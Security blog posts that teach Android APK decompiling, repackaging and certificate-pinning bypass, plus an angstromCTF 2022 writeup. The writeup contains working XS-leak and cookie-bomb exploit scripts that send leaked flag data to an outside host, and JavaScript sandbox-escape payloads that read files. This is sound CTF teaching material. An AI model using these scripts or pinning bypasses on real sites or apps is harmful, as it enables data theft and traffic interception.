android:text=&quot;hello&quot;, the screen will display hello. So why is the content above @string/hello_first_fragment? We can take a look at the file res/values/strings.xml: The content is: &lt;resources> &lt;string name=\"app_name\">My Application&lt;/string> &lt;string name=\"action_settings\">Settings&lt;/string> &lt;!-- Strings used for fragments for navigation --> &lt;string name=\"first_fragment_label\">First Fragment&lt;/string> &lt;string name=\"second_fragment_label\">Second Fragment&lt;/string> &lt;string name=\"next\">Next&lt;/string> &lt;string name=\"previous\">Previous&lt;/string> &lt;string name=\"hello_first_fragment\">Hello first fragment&lt;/string> &lt;string name=\"hello_second_fragment\">Hello second fragment. Arg: %1$s&lt;/string> &lt;/resources> We can see that there is a string named hello_first_fragment inside, and the content is Hello first fragment. Using this method, we can avoid hard-coding strings directly in the layout and avoid writing strings directly. Why avoid hard-coding? Because we want to do multilingualism! If you want to make an English version, you can actually create a new file called res/values/strings-en.xml or something similar. When Android detects that the operating system is in English, it will automatically fetch the strings in this file. In this way, you only need to change the string file, without touching the code. The above is a basic introduction to Android apps, including: What is AndroidManifest for? What is an activity? What are the uses of various XML files? After understanding these, we can start to decompile the APK. I wrote a simple example app, the link is here: https://github.com/aszx87410/demo/raw/master/android/demoapp.apk After running, it looks like this, small and cute: After clicking Check root, it will check whether the device has root and change the text on the screen. Simple APK decompilationActually, APK is a compressed file, so we can directly use the built-in command to unpack the APK: unzip demoapp.apk -d demoapp After unpacking, it looks like this: There are several folders and files: lib - used to store native code, will be discussed later META-INF - some signature-related information res - seen when writing the app AndroidManifest.xml - same as above classes.dex - the result of compiling the code into dex resources.arsc - index table related to resources Let’s talk about what resources.arsc is for. If you open any file under the res folder, you will find that the content is not pure text, but a bunch of hexadecimal things, like this: 0300 0800 8401 0000 0100 1c00 a800 0000 0700 0000 0000 0000 0001 0000 3800 0000 0000 0000 0000 0000 0f00 0000 1a00 0000 2600 0000 3000 0000 3800 0000 4200 0000 0c0c 696e 7465 7270 6f6c 6174 6f72 0008 0864 7572 6174 696f 6e00 0909 6672 6f6d 416c 7068 6100 0707 746f 416c 7068 6100 0505 616c 7068 6100 0707 616e 6472 6f69 6400 2a2a 6874 7470 3a2f 2f73 6368 656d This is because these XML files have been compiled and need to be combined with resources.arsc to restore them to text form. classes.dex is also compiled and needs to be decompiled further to see its contents. From the above, we can see that although it is possible to manually unpack an APK using decompression, there is not much useful content to be seen. To further see the contents, we need other tools to do this. Using Apktool to disassemble APKThe unzip used just now only simply unpacks the compressed file, and the website of Apktool writes explicitly: A tool for reverse engineering Android apk files, indicating that it is used to disassemble APK. I won’t write about the details of downloading and installing, you can refer to the official website: https://ibotpeaches.github.io/Apktool/ or other resources on the Internet. Next, let’s use Apktool to disassemble the demoapp just now: # d stands for decode # -f stands for --force, delete demoapp folder first if exists apktool d -f demoapp After disassembling, you can see the file structure below: . ├── AndroidManifest.xml ├── apktool.yml ├── lib ├── original ├── res └── smali The difference between this and the one we unpacked with a compressed file is that there is no resources.arsc, and there is no classes.dex. The former is because the resources have been restored to text files, and the latter has been restored to files under the smali folder, which will be mentioned in the next article. Next, let’s change the text on the screen. Open res/values/strings.xml and search for: Hello first fragment, you will find this paragraph: &lt;string name=\"hello_first_fragment\">Hello first fragment&lt;/string> We directly change the content to: &lt;string name=\"hello_first_fragment\">Hacked!&lt;/string> Next, just repackage the APK and install it, and you should be able to see the modified text. Repackaging APKIn addition to disassembling APK, Apktool can also reassemble APK. The command is as follows: apktool b demoapp -o demoapp2.apk If there is an error during packaging, you can use: apktool b --use-aapt2 demoapp -o demoapp2.apk If there is no accident, you will see a demoapp2.apk file in the folder. But if you install this file directly, an error will occur: adb: failed to install demoapp2.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl1575742168.tmp/base.apk: Attempt to get length of null array] This is because after the APK file is packaged, it needs to go through two procedures: align and sign, before it can be installed on the phone. Align is for performance considerations, and sign is for security. When uploading a new APK on the Google Play backend, Google will check whether the signature used for signing the APK is the same as before. If it is different, you will not be allowed to upload it. In this way, even if the attacker obtains the victim’s account, he cannot upload a new APK because the signature does not match. Let’s first generate a new signature: keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias Enter 123456 when asked for a password, and you can leave other fields blank. After execution, you will see a my-release-key.jks file. Next, I wrote a simple script to automatically remove the old version + build + align + sign + install: # compile.sh # remove old app adb uninstall com.cymetrics.demo # remove old apk rm -f demoapp2.apk rm -f demoapp2-final.apk rm -f demoapp2-aligned.apk # build apktool b --use-aapt2 demoapp -o demoapp2.apk # align zipalign -v -p 4 demoapp2.apk demoapp2-aligned.apk # sign apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --out demoapp2-final.apk demoapp2-aligned.apk adb install demoapp2-final.apk After running the script, open the app, and if there is no accident, you will see that the text has been changed by us: Yes, modifying a simple app is that simple. SummaryIn this article, we learned some basics of Android development, used Apktool to disassemble APK, saw the resources files inside, and re-packaged the modified APK file and installed it on the phone, making a modified version of the app. If you only need to change the text resources, it’s that easy, but if you need to modify the code, it’s relatively more complicated. In the next article, we will learn how to decompile smali into Java code and how to modify smali code. Series links: Introduction to Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs - You are here Introduction to Android App Reverse Engineering Part 2: Modifying Smali Code Introduction to Android App Reverse Engineering Part 3: Monitoring App Packets Introduction to Android App Reverse Engineering Part 4: Dynamic Analysis with Frida","link":"/2023/04/27/en/android-apk-decompile-intro-1/"},{"title":"Android App Reverse Engineering Part 3: Monitoring App Packets","text":"I remember when I first started working with Android, it was easy to see which requests an app was sending. All I had to do was install Charles on my computer, set up the Wi-Fi on my phone to proxy to my computer, and then download the certificate provided by Charles by entering a specific URL. Once installed, I was good to go. However, when I tried the same process recently, I could see some packets being sent, but the traffic coming out of the app was empty. I searched online for various solutions, but none of them worked. Finally, I found out that Android changed its security settings above 6.0, and by default, it does not trust certificates installed by users, which is why it cannot intercept them. One solution is to install a local VPN, which will route all traffic through the proxy, but I found it a bit cumbersome after trying it out. Among the many methods, the most useful one I tried was to unpack the apk, modify some settings, and then repack it. This article will document the process and experience. Series links: Android App Reverse Engineering Part 1: Unpacking and Rebuilding Apks Android App Reverse Engineering Part 2: Modifying Smali Code Android App Reverse Engineering Part 3: Monitoring App Packets Android App Reverse Engineering Part 4: Dynamic Analysis with Frida PrerequisitesThere are two prerequisites: Prepare a proxy Set up the phone Any proxy can be used for the proxy part. I used the common Burp Suite, and the settings for other software should be similar. First, go to Proxy -&gt; Options to add Proxy Listeners, and remember to select all interfaces for the bind to address so that the phone can connect: The computer’s proxy is now set up, and we can move on to setting up the phone. Before starting the setup, make sure that the phone and computer are connected to the same Wi-Fi network. Then, check the internal IP address of the computer and go to Settings &#x3D;&gt; Connections &#x3D;&gt; Wi-Fi on the phone to edit the connected network and set up a manual proxy to route the phone’s traffic to the computer. Next, we need to install Burp Suite’s certificate on the phone. Simply visit http://burpsuite on the phone, and a file called cert.der will be downloaded. Remember to rename it to cert.cer and then install the certificate. At this point, the phone is ready. Modifying the ApkThe apk used for this demonstration can be found here: https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk The content of the app is simple: pressing a button sends a request, and if it is intercepted, it means that it was successful. After installing the app, you can try it out. You should find that even though all the settings are in place, the proxy is still empty. As I mentioned at the beginning, there is a section in the Android official documentation that explains this: Network security configuration The modification method is also simple and basically does not require any changes to the code. Therefore, we first use Apktool to unpack the apk. Next, open AndroidManifest.xml and find &lt;application&gt;. Check if it has the attribute android:networkSecurityConfig. If it does not, add it: android:networkSecurityConfig=&quot;@xml/network_security_config&quot;. If it does, remember the name of the xml. Then, go to res&#x2F;xml and add network_security_config.xml, with the following content: &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;network-security-config> &lt;base-config cleartextTrafficPermitted=\"true\"> &lt;trust-anchors> &lt;certificates src=\"system\" /> &lt;certificates src=\"user\" /> &lt;/trust-anchors> &lt;/base-config> &lt;/network-security-config> This file represents that the app trusts all certificates, including those installed by the user. If the app already has this file, you can replace the contents with the above to ensure that the app trusts user certificates. Then repack the apk and click the button again to see if you can intercept the traffic from the proxy: Certificate pinningIf the proxy still cannot listen after the above steps, it means that the app may have other security settings, such as certificate pinning. What is certificate pinning? If a webpage uses https, it means that the server has an https certificate, and certificate pinning means that the app specifies what certificate should correspond to a certain domain. If the certificate does not match, it means that someone is messing with it in the middle, so the connection is rejected. Taking the popular library OkHttp as an example, the document writes how to implement this feature: String hostname = \"publicobject.com\"; CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(hostname, \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\") .build(); OkHttpClient client = OkHttpClient.Builder() .certificatePinner(certificatePinner) .build(); Request request = new Request.Builder() .url(\"https://\" + hostname) .build(); client.newCall(request).execute(); If you want to try it out, you can use this apk file: https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk We still use apktool to unpack it, then put the network security config in as before, and then find where the code uses certificate pinner. Because the code has turned on proguard this time, even okhttp has been obfuscated, and searching for the keyword certificatePinner may not find anything. What should we do? We can try another way. When using this feature, you must write a set of sha256 values in it, so we can search for: sha256/ We can find such a paragraph: # virtual methods .method public run()V .locals 13 .line 1 new-instance v0, Ljava/util/ArrayList; invoke-direct &#123;v0&#125;, Ljava/util/ArrayList;->&lt;init>()V const-string v1, \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\" .line 2 filled-new-array &#123;v1&#125;, [Ljava/lang/String; move-result-object v1 const-string v2, \"archive.org\" const-string v3, \"pattern\" .line 3 invoke-static &#123;v2, v3&#125;, Lc/j/b/d;->d(Ljava/lang/Object;Ljava/lang/String;)V const-string v3, \"pins\" invoke-static &#123;v1, v3&#125;, Lc/j/b/d;->d(Ljava/lang/Object;Ljava/lang/String;)V const/4 v3, 0x0 const/4 v4, 0x0 What should we do after finding it? Do we need to change smali and remove certificate pinner? In fact, there is a simpler way. From the code, we can guess that the archive.org below should be the bound domain, so as long as we change this domain to any other string, other domains will not check whether the certificate matches. After changing it, repack the app and install it, and you can listen to the traffic normally. Like the above, changing where certificatePinner is used, there is another way to directly change the implementation of okhttp. Find okhttp3/CertificatePinner$Builder.smali in smali, and there is a function: # virtual methods .method public varargs add(Ljava/lang/String;[Ljava/lang/String;)Lokhttp3/CertificatePinner$Builder; .locals 5 This is the method that okhttp uses to handle adding certificate pinner. We just need to change it like this: # virtual methods .method public varargs add(Ljava/lang/String;[Ljava/lang/String;)Lokhttp3/CertificatePinner$Builder; .locals 5 # patch const-string p1, \"abc\" So the first parameter (domain) will always be abc and will never take effect. SummaryIn this article, we learned how to modify the app ourselves and remove some anti-man-in-the-middle attack mechanisms, such as changing the network security config and the part of the code that handles certificate pinning. For general apps, this should be enough, at least to monitor traffic and see what the app is sending. And compared to the VPN solution, there is another advantage, that is, it can be repackaged twice, and a version that can work by replacing the API address can be produced, with higher flexibility. In the next article, we will learn another way to analyze apps. Series link: Android App Reverse Engineering Part 1: Disassembling and Reassembling APKs Android App Reverse Engineering Part 2: Modifying Smali Code Android App Reverse Engineering Part 3: Intercepting App Packets - You are here Android App Reverse Engineering Part 4: Dynamic Analysis with Frida","link":"/2023/04/27/en/android-apk-decompile-intro-3/"},{"title":"[Android] APK Decompilation for Everyone","text":"IntroductionFor Android engineers, understanding how to decompile can enhance their understanding of the Android system and also consider how to protect their APK from being decompiled. For the general public, many ready-made tools can help us easily decompile APKs and see Java source code, satisfying our curiosity. This article only introduces the use of some tools, suitable for beginners to watch. If you want to understand more underlying knowledge, you can refer to the extended reading attached at the end of the article. PreparationsFirst, we need an APK to be cracked. Simply build one with any tool you are familiar with. The structure is very simple, just a MainActivity and two TextViews. MainActivity.javapublic class MainActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView text = (TextView)findViewById(R.id.text); text.setText(\"Taiwan No1\"); &#125; &#125; activity_main.xml&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:orientation=\"vertical\" android:layout_height=\"match_parent\"> &lt;TextView android:text=\"@string/hello_world\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /> &lt;TextView android:id=\"@+id/text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /> &lt;/LinearLayout> After installing it on the phone, you will see this screen: Hands-onOkay, this is the APK we want to test. Then you need some very useful tools: apktool jd-gui dex2jar I won’t go into how to install them. You can read the documentation or search the internet for a bunch of answers. apktool is used to unpack the APK, which can decompile the APK and see the smali files and resource. dex2jar can convert the APK to a jar, and then use jd-gui to view the Java code. Then we open the terminal, go to the directory of the demo APK just now, and execute apktool d APKNAME.apk After execution, a APKNAME folder will be automatically generated, which contains the decompiled things. . ├── AndroidManifest.xml ├── apktool.yml ├── original ├── res └── smali One of the more noteworthy folders is the smali folder, which is actually your source code, just in a different format. You can find your MainActivity.java in the smali folder, with the following contents: (It may look strange, but if you look closely, you’ll find that it’s not that difficult to understand.) MainActivity.java.class public Lapktest/huli/com/apkdecompile/MainActivity; .super Landroid/app/Activity; .source \"MainActivity.java\" # direct methods .method public constructor &lt;init>()V .locals 0 .prologue .line 8 invoke-direct &#123;p0&#125;, Landroid/app/Activity;->&lt;init>()V return-void .end method # virtual methods .method protected onCreate(Landroid/os/Bundle;)V .locals 2 .param p1, \"savedInstanceState\" # Landroid/os/Bundle; .prologue .line 12 invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V .line 13 const v1, 0x7f040019 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->setContentView(I)V .line 14 const v1, 0x7f0c0050 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->findViewById(I)Landroid/view/View; move-result-object v0 check-cast v0, Landroid/widget/TextView; .line 15 .local v0, \"text\":Landroid/widget/TextView; const-string v1, \"Taiwan No1\" invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V .line 16 return-void .end method You can compare this with the Java code you wrote earlier and see that it’s just a different format. setContentView(R.layout.activity_main); Is actually equivalent to: .line 13 const v1, 0x7f040019 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;->setContentView(I)V You may wonder where 0x7f040019 comes from. In fact, you can find the answer in the res/values/public.xml file: &lt;public type=\"layout\" name=\"activity_main\" id=\"0x7f040019\" /> At this point, you should have a rough idea of the Android compilation process: Compress and process all resource files and package them together to generate an id-to-memory-location mapping table. Replace all R.xx.xxx in the code with actual memory locations using the table generated earlier. Convert Java code to smali code (similar to converting C code to assembly code). ModificationIn the smali code above, there is the following section: .line 15 .local v0, \"text\":Landroid/widget/TextView; const-string v1, \"Taiwan No1\" invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V Let’s replace Taiwan No1 with T@iw@n n0!.Do you remember the other TextView that used R.string.hello_world?In res/values/strings.xml, you can find the definition of this string: &lt;string name=\"hello_world\">Hello world!&lt;/string> Change it to: &lt;string name=\"hello_world\">HELLO WORLD&lt;/string> After making sure everything has been changed, you can “assemble” the code again.Do you remember the decompilation command we used earlier? apktool d APK_NAME.apkHere, d means decompile, so if you want to reverse assemble it, it’s b, build. apktool b APK_NAME After executing it, you can find an apk in APK_NAME/dist.Note that this apk has not been signed, so it cannot be installed.You can generate a keystore or find an existing one to sign it.jarsigner -verbose -digestalg SHA1 -keystore ~/KEY.keystore APK_NAME.apk KEY_ALIAS After installation, you will see this screen: Yes! It’s that simple. An apk has been modified like this. But smali code is hard to understand. Can we directly see the java code? This is where the recommended tools dex2jar and jd-gui come in handy. The former can turn an apk into a jar, and the latter can open a jar and display the java code. The combination of the two allows you to see the original code directly. After downloading dex2jar, there will be a bunch of shell scripts. dex2jar is the one we want. ./d2j-dex2jar.sh app.apk After execution, there will be a jar. Open it with jd-gui, and you will see your code at a glance. SummaryPeople who have not touched decompilation may be surprised: What! It’s so easy to modify an apk! Yes, it’s that simple, and this is just a very basic example. In fact, you can also add new code and resources (images, sounds, etc.). That is to say, you can not only modify but also extend the original apk. But there are also methods to prevent unscrupulous people from decompiling apk. For example, shell, obfuscation, dynamic loading, etc. I will introduce them later if there is a chance. Further reading Android Decompilation and Anti-Decompilation [Android] Code Obfuscation (ProGuard) and Decompilation [Android] Decompilation Cracking Android’s apk installation file Common tools and usage methods for decompilation Smali–Dalvik virtual machine instruction language–&gt;[android_smali syntax learning one] android decompilation-smali syntax","link":"/2016/03/20/en/android-apk-decompile/"},{"title":"ångstromCTF 2022 Writeup","text":"I didn’t check all the challenges this time because when I joined the competition, most of the challenges already solved by my teammates lol I love JavaScript(yep, including those weird features) and XS-leak, so this writeup will talk about only two challenges: web&#x2F;Sustenance misc&#x2F;CaaSio PSE web&#x2F;SustenanceIt’s a very simple app: const express = require(\"express\"); const cookieParser = require(\"cookie-parser\"); const path = require(\"path\"); const app = express(); app.use(express.urlencoded(&#123; extended: false &#125;)); // environment config const port = Number(process.env.PORT) || 8080; const adminSecret = process.env.ADMIN_SECRET || \"secretpw\"; const flag = process.env.FLAG || \"actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;\"; function queryMiddleware(req, res, next) &#123; res.locals.search = req.cookies.search || \"the quick brown fox jumps over the lazy dog\"; // admin is a cool kid if (req.cookies.admin === adminSecret) &#123; res.locals.search = flag; &#125; next(); &#125; app.use(cookieParser()); app.get(\"/\", (req, res) => &#123; res.sendFile(path.join(__dirname, \"index.html\")); &#125;); app.post(\"/s\", (req, res) => &#123; if (req.body.search) &#123; for (const [name, val] of Object.entries(req.body)) &#123; res.cookie(name, val, &#123; httpOnly: true &#125;); &#125; &#125; res.redirect(\"/\"); &#125;); app.get(\"/q\", queryMiddleware, (req, res) => &#123; const query = req.query.q || \"h\"; // h let status; if (res.locals.search.includes(query)) &#123; status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; &#125; else &#123; status = \"failed\"; &#125; res.redirect( \"/?m=\" + encodeURIComponent( `your search that took place at $&#123;Date.now()&#125; has $&#123;status&#125;` ) ); &#125;); app.listen(port, () => &#123; console.log(`Server listening on port $&#123;port&#125;`); &#125;); There are two features: You can set any cookie You can search whether certain characters exist in the flag There is no way to perform XSS, so it’s obviously a challenge about XS-leak. Since it’s XS-leak, we must observe what is the difference between “found” and “not found”. The search query is like this: /q?q=actf, if it’s found, it will redirect to/?m=your search...at 1651732982748 has success.... and not found will redirect to/?m=your search...ar 1651732982748 has failed There are two differences between success and failure: URL is different The content of the page is different At the beginning, the direction I tried was cache probing, because the visited pages will be stored in the disk cache, so as long as you use the method of fetch with force-cache, you can judge whether it is in the cache according to the time difference. As for the timestamp on the URL, just set a range such as 1~1000 to brute force. Because of the default SameSite&#x3D;Lax, you can only use window.open for top-level navigation when searching, otherwise the cookie will not be sent. The biggest problem is that Chrome now has cache partitioning, and the cache key of the newly opened page is: (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx), but if I open an ngrok page and use fetch in it, the cache key will be: (https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf .co/?m=xxx), the cache key is different, so the cache cannot be shared. You can find more detail here: Gaining security and privacy by partitioning the cache I also discussed with my teammates whether we can use the cookie bomb to do something since we can set cookies, but we didn’t find any way to exploit after the discussion. Then I tried to use the method in the pbctf 2021 Vault, use a:visited to leak the history, but I found that it’s not work in headless Chrome. It works in my local Chrome, but not in headless mode, the time to render the visited link is always fast(like 16ms). After a while, lebr0nli posted a POC on the channel about cache probing, which is modified from Maple’s writeup. The point is “we can use other same site domain to bypass cache partitioning”. For example, the URL for the other challenge is https://xtra-salty-sardines.web.actf.co/, if you use fetch from that domain, the cache key will also be (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx) because cache key only take eTLD+1 into account. So same site, same cache key. The problem he encountered is that it works on local, but on remote it’s always false positive. So I made another one based on his POC, tried to send back some more data, and found that the problem was that the server was running pretty fast. For example, if there is a cache, it takes 3ms, and if there is no cache, it only takes 5ms. The difference is very small. Even the timestamp part is also within 10ms after window.open. Therefore, I modified the exploit script and calculated the average time of cache at the remote end, and successfully leaked the flag. The script is as follows: https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722 // to hang the connection fetch('https://deelay.me/20000/https://example.com') // NOTE: we will calculate this baseline before doing the attack var baseLine = 3.2 const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms)) go() async function go() &#123; await calculateBaseline() main() async function calculateBaseline() &#123; var m = Math.random() let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m) // NOTE: this number can be decreased by detecting window load await sleep(500) win.close() let total = 0 for(let i=1; i&lt;=5; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m) total += ts report(`Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; // NOTE: 0.5 is just a random guess baseLine = (total/5) + 0.5 report(`Baseline: $&#123;baseLine&#125;`) // NOTE: adjust baseline, should not be more than 3 ms based on previous testing if (baseLine > 3) &#123; baseLine = 3 &#125; for(let i=1; i&lt;=3; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m) report(`Not Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; &#125; // NOTE: server is quite fast so no need to set timeout async function getLoadTime(url) &#123; const start = performance.now() await fetch(url, &#123; cache: 'force-cache', mode: 'no-cors' &#125;) return performance.now() - start &#125; function genSucceedUrl(t) &#123; let ft = t + '' while(ft.length &lt; 13) &#123; ft += '0' &#125; const status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at $&#123;ft&#125; has $&#123;status&#125;`); &#125; async function isCached(str) &#123; let start = +new Date() let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str)) await sleep(500) win.close() // NOTE: base on the data collected, i should be 1~20, pretty small number for(let i=1; i&lt;=30; i++) &#123; const url = genSucceedUrl(start + i) let loadTime = await getLoadTime(url) if (loadTime &lt;= baseLine) &#123; // NOTE: check again to see if it really meets the condition let total = 0 for(let j=1; j&lt;=3; j++) &#123; total += await getLoadTime(url) &#125; total/=3 if (total &lt;= baseLine) &#123; report(`isCached success, str=$&#123;str&#125;, i=$&#123;i&#125;, start=$&#123;start&#125;, total=$&#123;total&#125;`) return true &#125; &#125; &#125; return false &#125; async function main() &#123; let flag = 'actf&#123;yummy_' // NOTE: we can leak the charset first to speed up the process let chars = 'acefsmntuy_&#125;'.split('') while(flag[flag.length - 1] !== '&#125;') &#123; for(let char of chars) &#123; report('trying:' + flag + char) if (await isCached(flag + char)) &#123; flag += char report('flag:' + flag) break &#125; &#125; &#125; &#125; async function report(data) &#123; console.log(data) // TODO: change to your VPS return fetch('https://YOUR_VPS/', &#123; method: 'POST', body: data, mode: 'no-cors' &#125;).catch(err => err); &#125; &#125; We can leak the charset first, and the speed will be much faster. There are still some parts that can be improved, and the speed should be faster. Later, teammates posted another writeup: UIUCTF 2021- yana, it seems that headless chrome has no cache partitioning at the moment. I tested it myself and found that it is still the same now, so actually we don’t need other same site domain. It still works if you put this exploit on your own website. IntendedThe intended solution should be the cookie bomb I mentioned above. First, set a lot of cookies, and then use the feature that the URL of success and failure are different. If successful, the URL will be longer, the request will be too large to handle by the server so return an error http status code. If the search fails, nothing will happen because URL is short. The script below is from Strellic, you need to run it on another same site domain: &lt;>'\";&lt;form action='https://sustenance.web.actf.co/s' method=POST>&lt;input id=f />&lt;input name=search value=a />&lt;/form> &lt;script> const $ = document.querySelector.bind(document); const sleep = (ms) => new Promise(r => setTimeout(r, ms)); let i = 0; const stuff = async (len=3500) => &#123; let name = Math.random(); $(\"form\").target = name; let w = window.open('', name); $(\"#f\").value = \"_\".repeat(len); $(\"#f\").name = i++; $(\"form\").submit(); await sleep(100); &#125;; const isError = async (url) => &#123; return new Promise(r => &#123; let script = document.createElement('script'); script.src = url; script.onload = () => r(false); script.onerror = () => r(true); document.head.appendChild(script); &#125;); &#125; const search = (query) => &#123; return isError(\"https://sustenance.web.actf.co/q?q=\" + encodeURIComponent(query)); &#125;; const alphabet = \"etoanihsrdluc_01234567890gwyfmpbkvjxqz&#123;&#125;ETOANIHSRDLUCGWYFMPBKVJXQZ\"; const url = \"//en4u1nbmyeahu.x.pipedream.net/\"; let known = \"actf&#123;\"; window.onload = async () => &#123; navigator.sendBeacon(url + \"?load\"); await Promise.all([stuff(), stuff(), stuff(), stuff()]); await stuff(1600); navigator.sendBeacon(url + \"?go\"); while (true) &#123; for (let c of alphabet) &#123; let query = known + c; if (await search(query)) &#123; navigator.sendBeacon(url, query); known += c; break; &#125; &#125; &#125; &#125;; &lt;/script> Here are a few details to note: If the request is too large, the server will return an error(status 413 or 431 I think) Because it is the same site, &lt;script&gt; will automatically carry a cookie when sending a request You can use the onload&#x2F;onerror event of script to detect whether the http status code is successful or not misc&#x2F;CaaSio PSEIt’s a jsjail with strong restrictions: #!/usr/local/bin/node // flag in ./flag.txt const vm = require(\"vm\"); const readline = require(\"readline\"); const interface = readline.createInterface(&#123; input: process.stdin, output: process.stdout, &#125;); interface.question( \"Welcome to CaaSio: Please Stop Edition! Enter your calculation:\\n\", function (input) &#123; interface.close(); if ( input.length &lt; 215 &amp;&amp; /^[\\x20-\\x7e]+$/.test(input) &amp;&amp; !/[.\\[\\]&#123;&#125;\\s;`'\"\\\\_&lt;>?:]/.test(input) &amp;&amp; !input.toLowerCase().includes(\"import\") ) &#123; try &#123; const val = vm.runInNewContext(input, &#123;&#125;); console.log(\"Result:\"); console.log(val); console.log( \"See, isn't the calculator so much nicer when you're not trying to hack it?\" ); &#125; catch (e) &#123; console.log(\"your tried\"); &#125; &#125; else &#123; console.log( \"Third time really is the charm! I've finally created an unhackable system!\" ); &#125; &#125; ); It’s east to bypass VM, we can use this.constructor.constructor(&#39;return ...&#39;)() . But the difficult part is about the limited charset, we can’t use all string related symbol, also .[]();&gt; is not allowed. After trying for a while, I recalled that we can use with to access property, like this: with(console)log(123) For string, we can use regexp to bypass, like this:/string/.source. I also thought about decodeURI but haven’t try it, there are a lot of people solve it this way, like lebr0nli: eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))() If regexp is converted into a string, there will be one / at the start and the other at the end. We can solve this issue by adding /\\n to the regexp, it will be combined with the previous one like this: // your_code_here The idea is similar to the XSS challenge I made. Anyway, here is the basic structure for my payload: with(/console.log(1)/)with(this)with(constructor)constructor(source)() Just replace console.log(1) to the real code, the code we want to run is: return String(process.mainModule.require('fs').readFileSync('flag.txt')) String() is not required, just for better readability for the flag. Then, we can use with to rewrite the code: with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt'))) Since single quote is not allowed, we can make it a variable first, then think about how to remove it. with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n))) Now, the last part is to generate a string. We can do it via String.fromCharCode: with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule)with(require(k))return(String(readFileSync(n))) The final exploit just combined the code above with the structure, I formatted the code a bit for better readability: with( /with(String) with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule) with(require(k)) return(String(readFileSync(n))) /) with(this) with(constructor) constructor(source)() Other solutionsI learned a lot from Maple‘s writeup, for example, we can use with(a=source,/b/) to deal with the shadowing problem. with(/a/)with(/b/)console.log(source) You can only get /b/.source, not /a/.source because it’s shadowed. We can solve this by assigning the value to a variable before next with: with(/a/)with(a=source,/b/)console.log(a,source) Apart from these, he also uses require(&#39;repl&#39;).start() to start the repl mode, it’s a very smart move because you can run any code without the length limit. Below is Maple’s payload: with(/with(process)with(mainModule)with(require(x))start()/) with(s1=source,/x/) with(s2=source,/repl/) with(s3=source,this) with(constructor) constructor(s2,s1)(s3) Here is the payload from the author, the intended is without regexp: with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))()) with(mainModule) with(require(f(102,s))) readFileSync(f(102,108,97,103,46,t,120,t)) This solution is smart because of the variable part. It uses variable to save the space. We can combined this with Maple’s solution: with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))()) with(mainModule) with(require(f(r,e,p,108))) start() It can be shorter if we replace the first constructor to something else, we can search for the function in Object.prototype for(let key of Object.getOwnPropertyNames((obj=&#123;&#125;).__proto__)) &#123; if (typeof obj[key] === 'function') &#123; console.log(key) &#125; &#125; The shortest is valueOf: with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start() It’s 177 in length. For another kind of solution using unescape, I modified the payload from @fredd and got 115 in length in the end. eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))","link":"/2022/05/05/en/angstrom-ctf-2022-writeup-en/"},{"title":"ångstromCTF 2022 Notes","text":"I couldn’t participate on the first day of the competition due to some personal matters. When I joined on the second day, I found out that my teammates had already solved most of the web challenges, so there were many challenges that I didn’t get to see. Since I love JavaScript and XS-leak, I will only write about the two challenges that I found most interesting: web&#x2F;Sustenance 